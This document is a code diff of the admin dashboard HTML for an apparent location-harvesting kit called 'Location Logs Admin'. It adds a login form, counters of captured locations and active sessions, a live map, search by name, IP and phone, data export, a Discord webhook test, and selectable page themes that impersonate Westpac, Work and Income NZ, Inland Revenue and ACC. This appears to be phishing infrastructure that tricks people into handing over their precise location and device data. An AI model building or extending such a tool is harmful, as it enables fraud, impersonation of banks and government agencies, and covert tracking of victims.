@@ -35,41 +35,25 @@
 <body>
     <!-- Error handling -->
     <script>
-        // Global error handler
         window.onerror = function(msg, url, line, col, error) {
-            // Ignore h1-check.js errors
             if (msg.includes('h1-check.js') || msg.includes('detectStore')) {
-                return true; // Prevent error from bubbling up
+                return true;
             }
-            // Log other errors
-            console.error('Uncaught error:', {
-                message: msg,
-                url: url,
-                line: line,
-                column: col,
-                error: error
-            });
-            return false; // Let other errors propagate
+            console.error('Uncaught error:', { message: msg, url: url, line: line, column: col, error: error });
+            return false;
         };
-
-        // Prevent undefined property access
-        window.a = window.a || {};
-        if (window.a) {
-            window.a.default = window.a.default || {};
-            if (window.a.default) {
-                window.a.default.detectStore = window.a.default.detectStore || function() {
-                    return undefined; // Safe fallback
-                };
-            }
-        }
     </script>
 
     <div id="loginScreen">
         <form id="loginForm" class="text-center">
             <h2 class="mb-3">Location Logs Admin</h2>
             <div class="mb-2">
-                <input type="password" id="password" placeholder="Enter password" required autocomplete="current-password">
+                <input type="email" id="email" placeholder="Email" required autocomplete="email">
             </div>
+            <div class="mb-2">
+                <input type="password" id="password" placeholder="Password" required autocomplete="current-password">
+            </div>
+            <div id="loginError" class="login-error" style="display:none;"></div>
             <button type="submit" id="loginButton">Login</button>
         </form>
     </div>
@@ -82,7 +66,7 @@
             </div>
             <div class="nav-controls">
                 <div class="nav-group">
-                    <button class="button" onclick="window.admin.refreshData()">Refresh Data</button>
+                    <button class="button" id="refreshDataBtn">Refresh Data</button>
                     <div class="auto-refresh">
                         <input type="checkbox" id="autoRefresh">
                         <label for="autoRefresh">Auto-refresh</label>
@@ -94,39 +78,125 @@
                     <select id="themeSelect">
                         <option value="westpac">Westpac</option>
                         <option value="winz">Work and Income NZ</option>
+                        <option value="ird">Inland Revenue</option>
+                        <option value="acc">ACC</option>
                     </select>
+                    <button class="button button-preview" id="previewThemeBtn" title="Preview theme">👁 Preview</button>
+                </div>
+                <div class="nav-group">
+                    <span id="sessionTimer" class="session-timer"></span>
+                    <button class="button" id="testDiscordBtn" style="background:#5865F2;" title="Test Discord webhook">💬 Test Discord</button>
+                    <button class="button button-secondary" id="logoutButton">Logout</button>
                 </div>
             </div>
         </nav>
         
+        <!-- Stats Cards Row -->
+        <div class="stats-row">
+            <div class="stat-card stat-locations">
+                <div class="stat-card-header">
+                    <span class="stat-card-title">Total Locations</span>
+                    <span class="stat-card-icon">📍</span>
+                </div>
+                <div class="stat-card-value" id="statTotalLocations">0</div>
+                <div class="stat-card-label">All time captured</div>
+            </div>
+            <div class="stat-card stat-active">
+                <div class="stat-card-header">
+                    <span class="stat-card-title">Active Sessions</span>
+                    <span class="stat-card-icon">🔴</span>
+                </div>
+                <div class="stat-card-value" id="statActiveSessions">0</div>
+                <div class="stat-card-label">Currently active</div>
+            </div>
+            <div class="stat-card stat-accuracy">
+                <div class="stat-card-header">
+                    <span class="stat-card-title">Avg Accuracy</span>
+                    <span class="stat-card-icon">🎯</span>
+                </div>
+                <div class="stat-card-value" id="statAvgAccuracy">--</div>
+                <div class="stat-card-label">Metres</div>
+            </div>
+            <div class="stat-card stat-theme">
+                <div class="stat-card-header">
+                    <span class="stat-card-title">Active Theme</span>
+                    <span class="stat-card-icon">🎨</span>
+                </div>
+                <div class="stat-card-value" id="statActiveTheme" style="font-size:20px;">--</div>
+                <div class="stat-card-label">Current index theme</div>
+            </div>
+            <div class="stat-card stat-recent">
+                <div class="stat-card-header">
+                    <span class="stat-card-title">Last Location</span>
+                    <span class="stat-card-icon">⏱️</span>
+                </div>
+                <div class="stat-card-value" id="statLastLocation" style="font-size:18px;">--</div>
+                <div class="stat-card-label">Time ago</div>
+            </div>
+        </div>
+        
         <div id="errorMessage" class="error-message"></div>
         <div id="toast" class="toast"></div>
         
-        <!-- Split view layout -->
-        <div class="logs-panel">
-            <table class="logs">
-                <thead>
-                    <tr>
-                        <th>User Details</th>
-                        <th>Timestamp</th>
-                        <th>IP Address</th>
-                        <th>Location</th>
-                        <th>Accuracy</th>
-                        <th>Source</th>
-                        <th>Browser &amp; Device</th>
-                        <th>System Info</th>
-                        <th>Actions</th>
-                    </tr>
-                </thead>
-                <tbody id="logsTable">
-                    <!-- Data will be populated by JavaScript -->
-                </tbody>
-            </table>
+        <!-- Theme Preview Modal -->
+        <div id="themePreviewModal" class="theme-preview-modal" style="display:none;">
+            <div class="theme-preview-overlay"></div>
+            <div class="theme-preview-content">
+                <div class="theme-preview-header">
+                    <h3>Theme Preview</h3>
+                    <button class="theme-preview-close" id="closePreviewBtn">&times;</button>
+                </div>
+                <iframe id="themePreviewFrame" class="theme-preview-frame"></iframe>
+            </div>
         </div>
+        
+        <!-- Dashboard Content: Logs + Map -->
+        <div class="dashboard-content">
+            <!-- Logs Panel -->
+            <div class="logs-panel">
+                <div class="logs-header">
+                    <span class="logs-title">Location Feed</span>
+                    <div class="logs-controls">
+                        <div class="search-box">
+                            <input type="text" id="searchInput" placeholder="Search name, IP, phone...">
+                        </div>
+                        <button class="export-btn" id="exportCsvBtn">📥 CSV</button>
+                        <button class="export-btn" id="exportJsonBtn" style="background:#17a2b8;">📥 JSON</button>
+                    </div>
+                </div>
+                <div class="logs-table-wrapper">
+                    <table class="logs">
+                        <thead>
+                            <tr>
+                                <th class="sortable" data-sort="firstName">User</th>
+                                <th class="sortable" data-sort="timestamp">Timestamp</th>
+                                <th class="sortable" data-sort="ip">IP Address</th>
+                                <th>Location</th>
+                                <th class="sortable" data-sort="accuracy">Accuracy</th>
+                                <th class="sortable" data-sort="locationSource">Source</th>
+                                <th>Browser & Device</th>
+                                <th>Actions</th>
+                            </tr>
+                        </thead>
+                        <tbody id="logsTable">
+                        </tbody>
+                    </table>
+                </div>
+                <div class="pagination">
+                    <span class="pagination-info" id="paginationInfo">Showing 0 of 0</span>
+                    <div class="pagination-controls" id="paginationControls">
+                    </div>
+                </div>
+            </div>
 
-        <div class="map-panel">
-            <div class="map">
-                <div id="locationMap"></div>
+            <!-- Map Panel -->
+            <div class="map-panel">
+                <div class="map-header">
+                    <span class="map-title">Live Map</span>
+                </div>
+                <div class="map">
+                    <div id="locationMap"></div>
+                </div>
             </div>
         </div>
     </div>
@@ -134,30 +204,10 @@
     <!-- Firebase SDK -->
     <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-auth-compat.js"></script>
     
     <!-- Firebase Configuration and Initialization -->
     <script src="src/core/firebase-config.js"></script>
-    <script>
-        // Wait for Firebase SDK to load
-        window.firebaseLoaded = new Promise((resolve) => {
-            if (typeof firebase !== 'undefined') {
-                resolve();
-            } else {
-                window.addEventListener('load', () => {
-                    if (typeof firebase !== 'undefined') {
-                        resolve();
-                    } else {
-                        const checkFirebase = setInterval(() => {
-                            if (typeof firebase !== 'undefined') {
-                                clearInterval(checkFirebase);
-                                resolve();
-                            }
-                        }, 100);
-                    }
-                });
-            }
-        });
-    </script>
     <script src="src/core/firebase-init.js"></script>
     
     <!-- Leaflet JS -->
@@ -175,7 +225,10 @@
     <script type="module">
         window.firebaseLoaded.then(() => {
             import('./src/features/admin/admin.js').then(module => {
-                window.admin = { refreshData: module.refreshData };
+                window.admin = { 
+                    refreshData: module.refreshData,
+                    initializeAdmin: module.initializeAdmin
+                };
             }).catch(error => {
                 console.error('Failed to load admin module:', error);
             });
